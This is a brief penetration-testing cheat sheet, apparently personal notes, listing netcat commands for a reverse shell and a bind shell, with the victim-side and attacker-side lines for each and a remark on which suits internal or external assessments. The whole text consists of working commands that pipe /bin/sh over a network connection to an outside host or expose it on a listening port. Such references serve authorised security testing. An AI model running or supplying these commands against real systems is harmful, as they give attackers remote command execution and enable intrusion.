remote shell

**netcat reverse shell**

used mostly in internal 
```
# Reverse shell they open a connection with us
# victim
nc <ip> <port> -e /bin/sh

# attacker
nc -lvp <same port>
```

**netcat bind shell**

Mostly used in extenal assessment, used with firewalls
```
# Bind shell, they open a connection for us
# victim
nc -lvp <port> -e /bin/sh

#attacker
nc <ip> <same port>

```